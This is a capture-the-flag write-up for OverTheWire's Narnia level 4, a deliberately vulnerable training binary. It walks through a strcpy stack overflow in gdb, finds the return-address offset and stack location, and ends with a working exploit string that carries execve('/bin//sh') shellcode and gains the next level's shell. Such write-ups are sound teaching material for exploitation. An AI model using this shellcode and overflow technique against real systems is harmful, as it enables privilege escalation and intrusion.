#Narnia4

narnia.labs.overthewire.org

**Username:** narnia4
**Password:** see [narnia3](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria3)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Let's start out like we normally do and execute the application.
>
>```
# ./narnia4 
# ./narnia4 Test
# 
>```
>
> Well that's weird.  Let's see what we can gather from the source.
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
>
extern char **environ;
>
int main(int argc,char **argv){
	int i;
	char buffer[256];
>
	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
>
	if(argc>1)
		strcpy(buffer,argv[1]);
>
	return 0;
}
>```
>
> Ok, similiar to previous challenges we can see the character array ```char buffer[256];``` initialized and then used in ```strcpy(buffer,argv[1]);``` without checking the size of ```argv[1]```.  Let's go ahead start up gdb and poke around.
>
>```
(gdb) run $(python -c 'print "A"*100')
Starting program: /root/narnia4 $(python -c 'print "A"*100')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
[Inferior 1 (process 6557) exited normally]
(gdb) run $(python -c 'print "A"*200')
Starting program: /root/narnia4 $(python -c 'print "A"*200')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
[Inferior 1 (process 6560) exited normally]
(gdb) run $(python -c 'print "A"*300')
Starting program: /root/narnia4 $(python -c 'print "A"*300')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.
>
Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run $(python -c 'print "A"*275')
Starting program: /root/narnia4 $(python -c 'print "A"*275')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) c
Continuing.
>
Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run $(python -c 'print "A"*276')
Starting program: /root/narnia4 $(python -c 'print "A"*276')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
>```
>
> Ok, we saw our ```A``` when we submitted 300 of them.  After backing off to 275, we see 3 positions overwritten with ```A```.  Adding one to that looks like we have our magic number as it appears we have overwritten a return address successfully with ```0x41414141``` with 276 ```A```.
>
> Let's see if we can pinpoint a location for our 28 byte shellcode and an address to return back to.
>
>```asm
(gdb) run $(python -c 'print "A"*244+"R"*28+"A"*4')
Starting program: /root/narnia4 $(python -c 'print "A"*244+"R"*28+"A"*4')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/300x $esp
0xffffd400:	0x00000000	0xffffd4a4	0xffffd4b0	0xf7fdb860
0xffffd410:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x0804828b
0xffffd420:	0x00000001	0xffffd460	0xf7fedc16	0xf7ffdac0
0xffffd430:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
0xffffd440:	0xffffd478	0x6a7d42c1	0x586954d1	0x00000000
0xffffd450:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd460:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
0xffffd470:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd480:	0x080484ad	0x00000002	0xffffd4a4	0x08048550
0xffffd490:	0x080485c0	0xf7fee590	0xffffd49c	0xf7ffd908
0xffffd4a0:	0x00000002	0xffffd5f3	0xffffd601	0x00000000
0xffffd4b0:	0xffffd716	0xffffd729	0xffffd75c	0xffffd767
0xffffd4c0:	0xffffd777	0xffffd7c5	0xffffd7d7	0xffffd809
0xffffd4d0:	0xffffd813	0xffffdd34	0xffffdd62	0xffffddb0
0xffffd4e0:	0xffffddbe	0xffffddc9	0xffffdde1	0xffffde23
0xffffd4f0:	0xffffde32	0xffffde3c	0xffffde4d	0xffffde64
0xffffd500:	0xffffde79	0xffffde82	0xffffde95	0xffffdea0
0xffffd510:	0xffffdea8	0xffffded4	0xffffdee1	0xffffdf43
0xffffd520:	0xffffdf80	0xffffdf8d	0xffffdf9a	0xffffdfb3
0xffffd530:	0x00000000	0x00000020	0xf7fded00	0x00000021
0xffffd540:	0xf7fde000	0x00000010	0x0fabfbff	0x00000006
0xffffd550:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffd560:	0x08048034	0x00000004	0x00000020	0x00000005
0xffffd570:	0x00000008	0x00000007	0xf7fe0000	0x00000008
0xffffd580:	0x00000000	0x00000009	0x080483b0	0x0000000b
0xffffd590:	0x00000000	0x0000000c	0x00000000	0x0000000d
0xffffd5a0:	0x00000000	0x0000000e	0x00000000	0x00000017
0xffffd5b0:	0x00000000	0x00000019	0xffffd5db	0x0000001f
0xffffd5c0:	0xffffdfea	0x0000000f	0xffffd5eb	0x00000000
0xffffd5d0:	0x00000000	0x00000000	0x0d000000	0xa1628788
0xffffd5e0:	0x159f4aea	0x401aef6a	0x691a76d9	0x00363836
0xffffd5f0:	0x2f000000	0x746f6f72	0x72616e2f	0x3461696e
0xffffd600:	0x41414100	0x41414141	0x41414141	0x41414141
0xffffd610:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd620:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd630:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd640:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6f0:	0x41414141	0x52525241	0x52525252	0x52525252
0xffffd700:	0x52525252	0x52525252	0x52525252	0x52525252
0xffffd710:	0x41414152	0x00000041	0x00000000	0x00000000
>```
>
> Ok, so it looks like we can return back to ```0xffffd6f4``` and put our shellcode there.  Let's try it.
>
>```
(gdb) run $(python -c 'print "A"*244+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xf4\xd6\xff\xff"')
Starting program: /root/narnia4 $(python -c 'print "A"*244+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xf4\xd6\xff\xff"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
process 6592 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
>```
>
> We've seen this before.  It looks like everything is working locally (just the wrong architecture for the shellcode).  Let's move to the server and see if we need to remap anything.
>
>```asm
narnia4@melinda:/narnia$ gdb narnia4
(gdb) run $(python -c 'print "A"*244+"R"*28+"A"*4')
Starting program: /games/narnia/narnia4 $(python -c 'print "A"*244+"R"*28+"A"*4')
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/300x $esp
0xffffd5d0:	0x00000000	0xffffd664	0xffffd670	0xf7feacea
0xffffd5e0:	0x00000002	0xffffd664	0xffffd604	0x080497cc
0xffffd5f0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
0xffffd600:	0x00000000	0xd35f81d1	0xeb6065c1	0x00000000
0xffffd610:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd620:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd630:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd640:	0x080484ad	0x00000002	0xffffd664	0x08048550
0xffffd650:	0x080485c0	0xf7feb180	0xffffd65c	0x0000001c
0xffffd660:	0x00000002	0xffffd79b	0xffffd7b1	0x00000000
0xffffd670:	0xffffd8c6	0xffffd8db	0xffffd8eb	0xffffd8f6
0xffffd680:	0xffffd916	0xffffd92a	0xffffd933	0xffffd940
0xffffd690:	0xffffde61	0xffffde6c	0xffffde78	0xffffded6
0xffffd6a0:	0xffffdeed	0xffffdefc	0xffffdf08	0xffffdf19
0xffffd6b0:	0xffffdf22	0xffffdf35	0xffffdf3d	0xffffdf4d
0xffffd6c0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6d0:	0x00000020	0xf7fdbb20	0x00000021	0xf7fdb000
0xffffd6e0:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd6f0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd700:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd710:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd720:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd730:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd740:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd750:	0x00000019	0xffffd77b	0x0000001f	0xffffdfe2
0xffffd760:	0x0000000f	0xffffd78b	0x00000000	0x00000000
0xffffd770:	0x00000000	0x00000000	0x5d000000	0x1086f177
0xffffd780:	0xbf17167a	0x902c70f3	0x69509589	0x00363836
0xffffd790:	0x00000000	0x00000000	0x2f000000	0x656d6167
0xffffd7a0:	0x616e2f73	0x61696e72	0x72616e2f	0x3461696e
0xffffd7b0:	0x41414100	0x41414141	0x41414141	0x41414141
0xffffd7c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x52525241	0x52525252	0x52525252
0xffffd8b0:	0x52525252	0x52525252	0x52525252	0x52525252
0xffffd8c0:	0x41414152	0x00000041	0x00000000	0x00000000
>```
>
> Looks like we need to update our return address to ```0xffffd8a4```.
>
>```
narnia4@melinda:/narnia$ ./narnia4 $(python -c 'print "A"*244+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"\xa4\xd8\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
**********
$ 
>```
>
> Well that one seemed easier.  Let's head to narnia5.
